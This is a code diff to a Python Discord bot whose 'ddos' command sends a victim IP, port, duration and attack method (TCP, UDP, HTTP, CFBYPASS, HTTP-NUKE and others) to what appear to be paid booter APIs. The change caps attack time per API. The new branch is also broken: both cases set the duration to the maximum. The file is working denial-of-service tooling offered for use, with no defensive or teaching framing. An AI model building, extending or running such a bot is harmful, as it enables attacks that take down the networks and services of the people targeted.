@@ -28,7 +28,6 @@ admins  = [1, 2, 3]              # Replace digits with Discord USER-IDs! (admins
 owners  = [1, 2, 3]              # Replace digits with Discord USER-IDs! (owners, they cannot be removed!!)
 token   = 'your_token_lol'                  # Discord Bot token
 bot     = commands.Bot(command_prefix='.')
-maxtime = 1200 # The max booting time for our bot. You need to change it, probably.
 
 l4methods = ['TCP', 'UDP', 'STD']             # Our Layer4 methods. Add more if desired!
 l7methods = ['HTTP', 'CFBYPASS', 'HTTP-NUKE'] # Our Layer7 methods. Add more if desired!
@@ -38,10 +37,12 @@ api_data = [
     {
         'api_url':'https://www.yahoo.com', # API URL #1
         'api_key':'KEYYYYYY',              # API KEY #1
+        'max_time':'1200'                  # The max booting time for our bot. You need to change it, probably.
     },
     {
         'api_url':'https://www.google.com', # API URL #1
         'api_key':'KEYYYYYY',               # API KEY #1
+        'max_time':'300'                    # The max booting time for our bot. You need to change it, probably.
     }
 ]
 
@@ -139,10 +140,17 @@ async def ddos(ctx, method : str = None, victim : str = None, port : str = None,
                 try:
                     api_url = i["api_url"]
                     api_key = i["api_key"]
+                    max_time = int(i["max_time"])
+
+                    if int(time) > max_time:
+                        time2 = max_time
+
+                    else:
+                        time2 = max_time
 
                     async with aiohttp.ClientSession() as session:
-                        await session.post(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}&method={method.upper()}')
-                        #print(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time}&method={method.upper()}')
+                        await session.post(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time2}&method={method.upper()}')
+                        #print(f'{api_url}/?key={api_key}&ip={victim}&port={port}&time={time2}&method={method.upper()}')
 
                 except Exception as e:
                     #print(e)
